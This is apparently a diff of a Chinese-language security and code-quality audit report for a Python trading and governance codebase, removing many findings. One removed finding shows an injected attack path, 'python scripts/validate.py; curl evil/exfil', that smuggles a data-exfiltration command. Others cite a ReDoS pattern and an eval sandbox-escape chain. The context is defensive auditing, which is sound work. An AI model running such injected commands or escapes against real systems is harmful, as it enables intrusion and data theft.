-- **修复**：移除默认值，强制从环境变量/密钥管理服务注入；缺省时抛出显式配置错误。
 
 #### 5.130.2 [LOW] 文档字符串中的API key占位符（2处）
 
@@ -7761,12 +7565,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - **文件**：`src/zephyr/security/llm_defense/llm_security/runtime_interceptor.py:95`
 - **问题**：`_tls = threading.local()`存储LSG放行令牌`_tls.allowance`（`tuple[float, str]` = 过期时间戳+request_id），授予绕过LSG安全网关直接调用LLM API的权限。TTL默认30s。若`grant_allowance()`被调用后请求异常退出且`revoke_allowance()`未在finally中执行，令牌在线程上存活最长30s。线程池复用该线程处理新请求时，新请求直接调用LLM API会读到上一个请求的未过期令牌——**跨请求安全上下文泄漏**，绕过RULE-LSG-001安全网关。全代码库无请求边界重置`_tls`的逻辑。
 - **修复**：在请求边界（中间件/拦截器入口）重置`_tls`；或将同步路径也改为`contextvars`（与异步路径一致）。
-
-#### 5.132.2 [MEDIUM] sqlite_metadata_store的_local.conn在线程池中泄漏
-
-- **文件**：`src/zephyr/integration/vector_memory/sqlite_metadata_store.py:119`
-- **问题**：`self._local.conn`按线程懒创建sqlite连接。`close()`方法只关闭调用线程的conn。若store在N个线程的线程池中被访问，产生N个连接，但`close()`只关1个，其余N-1个连接泄漏（文件句柄、WAL锁持有）。连接使用`check_same_thread=False`却又用`_local`做每线程独立连接——设计自相矛盾。
-- **修复**：要么统一用单连接+`check_same_thread=False`，要么`close()`遍历所有线程连接。
 
 #### 5.132.3 [MEDIUM] span_stub的_THREAD_LOCAL._span_stack跨请求泄漏
 
@@ -7894,11 +7692,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 
 - **文件**：`src/zephyr/behavioral_audit/baseline_manager.py:119`
 - **问题**：函数签名标注`-> str | None`，但实际始终返回`str`（`hashlib.sha256(...).hexdigest()`）。若文件打开失败会抛异常而非返回None。注解错误，应为`str`。对比：`detector_dispatcher.py:44`的`_compute_file_hash`注解正确为`-> str`。
-
-#### 5.134.2 [LOW] auto_kill_on_errors使用未导入的Optional
-
-- **文件**：`src/zephyr/autonomy_core/skill_kill_switch.py:70`
-- **问题**：返回类型注解`Optional[dict[str, Any]]`，但文件仅`from typing import Any`未导入`Optional`。因有`from __future__ import annotations`注解延迟求值，运行时不报错；但`typing.get_type_hints()`求值会触发`NameError`。
 
 **严重度汇总**：HIGH=0, MEDIUM=1, LOW=1, 合计=2
 
@@ -8043,11 +7836,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
   - `trading/boot_hooks.py:73-528` — 26处延迟import，`governance.task_repo`重复延迟7次
 - **问题**：`governance.audit_trail`被4处不同文件用try/except容错——审计链是H级安全功能，静默降级违反不变式。
 
-#### 5.138.3 [LOW] 合理的延迟import模式（2处，信息性记录）
-
-- `behavioral_audit/__init__.py:295-318` — PEP 562合理懒加载（256符号映射），非循环规避
-- `trading/auto_runtime_core.py:31-40` — TYPE_CHECKING标准循环规避做法（合规）
-
 **严重度汇总**：HIGH=7, MEDIUM=6, LOW=2, 合计=15
 
 ---
@@ -8055,12 +7843,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 ### 5.139 TODO/FIXME技术债务标记（1个，第24轮新增）
 
 > **审计结论**：本维度**仅发现1处真实技术债务标记**，代码库在该维度极为清洁。全量搜索TODO/FIXME/HACK/XXX/WORKAROUND/TEMP共63处匹配，但62处为误报（混沌注入器的"伪TODO地雷"、检测器检测模式、配置模板占位符、领域术语P-Hacking等）。项目对技术债务标记有主动检测与拦截机制。
-
-#### 5.139.1 [LOW] boot_hooks.py的TODO待办（已关联工单）
-
-- **文件**：`trading/boot_hooks.py:88`
-- **问题**：`# TODO DM-201247: 当 HealthMonitor 分钟级调度就绪后接入`——AggregateHealth的接入被显式延迟。已关联工单DM-201247，属于"已跟踪的延迟集成项"，治理状态良好。
-- **修复**：待HealthMonitor实现分钟级调度后接入。
 
 **严重度汇总**：HIGH=0, MEDIUM=0, LOW=1, 合计=1
 
@@ -8388,43 +8170,11 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 
 审查SQL注入、路径遍历、命令注入、格式化字符串注入、ReDoS等字符串安全漏洞。
 
-#### 5.146.1 [MEDIUM] post_sync_standard命令经shell=True执行且校验存在元字符盲区
-
-- [governance/task_repo.py:1811-1817](file:///D:/ZephyrAlpha/src/zephyr/governance/task_repo.py#L1811)
-- `commands`来自任务卡post_sync_standard字段(AI agent建卡写入)，校验仅按`&&`/`||`/`\n`拆分，不处理`;`/`|`/`$()`/反引号/`>`。`shell=True`将完整字符串交给shell解释。攻击路径：`python scripts/validate.py; curl evil/exfil`。违反项目自身`process_sandbox.py:53`的shell=True禁止策略
-- 修复：改为`subprocess.run(shlex.split(cmd), shell=False)`列表形式；或引入命令白名单
-
-#### 5.146.2 [MEDIUM] yaml.load使用FullLoader（非SafeLoader），违反项目自身策略
-
-- [governance/audit_orchestrator/pipeline_runner.py:643](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestrator/pipeline_runner.py#L643) + audit_trail/pipeline_runner.py:646
-- CVE-2020-14343证明FullLoader仍可RCE。项目自身`vibe_security_verify.py:41`将`yaml.load(`判定为no_yaml_unsafe_load违规。项目其余100+处YAML加载均用safe_load，唯独这两处遗留
-- 修复：替换为`yaml.safe_load(f)`
-
-#### 5.146.3 [LOW] eval()处理skip_condition表达式，builtins限制可被对象属性链绕过
-
-- [integration/models.py:601](file:///D:/ZephyrAlpha/src/zephyr/integration/models.py#L601) + infrastructure/pipeline/models.py:602
-- `{"__builtins__": {}}`是弱沙箱——namespace中暴露存活对象ctx，通过`ctx.__class__.__mro__[...].__subclasses__()`可逃逸到__import__。当前skip_condition仅来自硬编码常量(不可利用)，但字段是Pydantic str类型，未来数据驱动即转为RCE
-- 修复：用受限表达式求值器替代eval，或改用声明式条件字段
-
-#### 5.146.4 [LOW] INSERT语句列名来自dict.keys()拼接（值已参数化，列名未参数化）
-
-- [governance/database_service.py:172,315](file:///D:/ZephyrAlpha/src/zephyr/governance/database_service.py#L172)
-- 值通过`?`占位符参数化(安全)，但列名`columns`直接由`task_data.keys()`拼入SQL。当前task_data来自内部服务调用(键固定)，但缺乏防御——若dict键未来来自外部数据可注入
-- 修复：拼接前对列名做白名单校验
-
 #### 5.146.5 [LOW] str.format_map渲染可能外部可控的模板文本
 
 - [autonomy_core/prompt_registry.py:245](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/prompt_registry.py#L245) + support/prompt_registry.py:244
 - `format_map`支持格式说明符中的属性访问(`{var.__class__}`)。`template_text`是AI可编辑的prompt模板，`effective`字典值虽经str()转换缓解了RCE，但仍是纵深防御缺口
 - 修复：改用`string.Template`(仅${name}替换)或自定义SafeFormatter
-
-#### 5.146.6 [LOW] re.compile编译Pydantic str字段（潜在ReDoS）
-
-- [autonomy_core/pattern_library.py:470](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/pattern_library.py#L470)
-- `p.detection`是Pydantic str字段。当前默认值为硬编码正则(无灾难性回溯)，但构造函数接受外部patterns，一旦从YAML/DB加载patterns，恶意提交`(a+)+$`即可触发ReDoS
-- 修复：对detection字段增加正则复杂度校验，或引入RE2引擎
-
-**N/A维度**：路径遍历(无外部用户输入直接流入路径拼接)、pickle反序列化(已在5.117覆盖)、os.system(无实际调用)、XXE(项目不使用XML解析)、open()用户输入未realpath(无可利用路径)
 
 **严重度汇总**：HIGH=0, MEDIUM=2, LOW=4, 合计=6
 
@@ -8440,34 +8190,17 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - `joblib.load`内部使用`pickle.load`，可在反序列化时执行任意代码。`model_path`是公共方法参数，无任何校验(签名验证/来源白名单)。若model_path可被外部配置影响，攻击者可构造恶意.joblib文件实现RCE
 - 修复：对模型文件做哈希/签名验证；或改用skops.io.load；至少在类型签名中约束model_path必须来自可信分发渠道
 
-#### 5.147.2 [MEDIUM] yaml.load使用FullLoader（与5.146.2同源，此处归入序列化维度）
-
-- 见5.146.2 — 2处pipeline_runner.py使用`yaml.load(f, Loader=yaml.FullLoader)`
-- 修复：替换为`yaml.safe_load(f)`
-
 #### 5.147.3 [MEDIUM] MCP stdio服务器Content-Length无上限+json.loads无大小限制
 
 - [infrastructure/_base_server.py:453-460,494,552](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/_base_server.py#L453)
 - `_read_message`从stdin读取Content-Length头后直接`inp.read(content_length)`，无上限。恶意客户端可发送`Content-Length: 999999999999`触发OOM Kill
 - 修复：设定MAX_MESSAGE_BYTES(如10MB)，超限返回ERR_PARSE_ERROR
 
-#### 5.147.4 [MEDIUM] json.dumps(default=str)大量用于状态持久化，破坏往返类型保真
-
-- 79+处代表性样本：[behavioral_audit/cascade_detector.py:126](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/cascade_detector.py#L126) + canary_controller.py + absence_manager.py + handoff_manager.py + forensics_engine.py + governance/audit_trail/writer.py:78
-- `default=str`是兜底序列化器——datetime变为字符串，加载后无法区分原始字符串还是datetime。handoff_manager.py的load_package被迫用str()逐字段强转补偿
-- 修复：使用项目SSoT序列化模块`zephyr.shared.io.serialization.to_json`/`from_json`
-
 #### 5.147.5 [MEDIUM] asdict()+**data.get(...)模式的版本兼容性缺陷
 
 - [intelligence/model_profiling/capability_passport.py:289-312,500-514](file:///D:/ZephyrAlpha/src/zephyr/intelligence/model_profiling/capability_passport.py#L289)
 - `**data.get("breadth", {})`将保存的dict直接展开为构造函数参数。类新增必填字段→旧JSON缺参TypeError；类删除字段→旧JSON含废弃字段TypeError。虽有passport_version字段但_from_dict完全忽略版本——无迁移逻辑
 - 修复：在_from_dict中读取passport_version按版本迁移；或改用Pydantic model_validate
-
-#### 5.147.6 [MEDIUM] copy.deepcopy处理可能含循环引用的context字典
-
-- [autonomy_core/skill_context_isolation.py:77,115,123](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/skill_context_isolation.py#L77)
-- `context: dict[str, Any]`值类型为Any——调用方可传入含循环引用的结构。copy.deepcopy遇到循环引用会无限递归抛RecursionError
-- 修复：使用`copy.deepcopy(context, memo={})`并捕获RecursionError；或限制deepcopy深度
 
 #### 5.147.7 [MEDIUM] json.loads(text.replace("'", '"'))启发式解析Python-repr为JSON
 
@@ -8492,14 +8225,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 - [governance/behavioral_admission/gpu_consensus_scheduler.py:502-505](file:///D:/ZephyrAlpha/src/zephyr/governance/behavioral_admission/gpu_consensus_scheduler.py#L502)
 - `text.find("{")` + `text.rfind("}")`提取JSON。若文本含多段JSON或花括号，text[start:end]可能横跨非JSON内容
 - 修复：使用`json.JSONDecoder().raw_decode`增量解析
-
-#### 5.147.11 [LOW] headless_scanner对子进程stdout做json.loads无大小限制
-
-- [behavioral_audit/headless_scanner.py:81](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/headless_scanner.py#L81)
-- `subprocess.run`捕获stdout后直接`json.loads(result.stdout)`。timeout=30限制执行时间但不限制输出量——30秒内可产生数GB文本
-- 修复：json.loads前校验`len(result.stdout) <= MAX_OUTPUT_SIZE`
-
-**N/A维度**：marshal.loads(全项目无使用)、自定义__getstate__/__setstate__(全项目无实现)、shelve模块(全项目无使用)
 
 **严重度汇总**：HIGH=1, MEDIUM=7, LOW=3, 合计=11
 
@@ -9323,14 +9048,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 
 **kb/verify 与 kb/self_test 异常（9个）**
 
-40. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\verify.py:122` — FactResult(error=str(e)) 含 KB 验证异常
-41. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:190` — CheckResult(str(e)) 含 KB 自检异常
-42. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:239` — 同上
-43. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:272` — 同上
-44. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:299` — 同上
-45. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:323` — 同上
-46. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:346` — 同上
-47. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:380` — 同上
 48. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\kb\self_test.py:420` — 同上
 
 **其他 governance/trading 异常（4个）**
@@ -9348,7 +9065,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 56. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:323` — 同上
 57. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:370` — 同上
 58. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\self_test_verifier.py:402` — 同上
-59. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:91` — 重复实现
 60. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:124` — 同上
 61. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:161` — 同上
 62. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\self_test_verifier.py:236` — 同上
@@ -9357,7 +9073,6 @@ AGENTS.md §3列出9个核心系统，仅LSG注册为capability；RULE-ZERO/FOUR
 
 **integration_test_runner 异常（2个）**
 
-65. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\behavioral_audit\integration_test_runner.py:103` — 返回 `{"detail": str(e)}` 含 pip check 异常
 66. **[MEDIUM]** `d:\ZephyrAlpha\src\zephyr\governance\drift_detection\integration_test_runner.py:78` — 重复实现，同上
 
 #### LOW（37个）
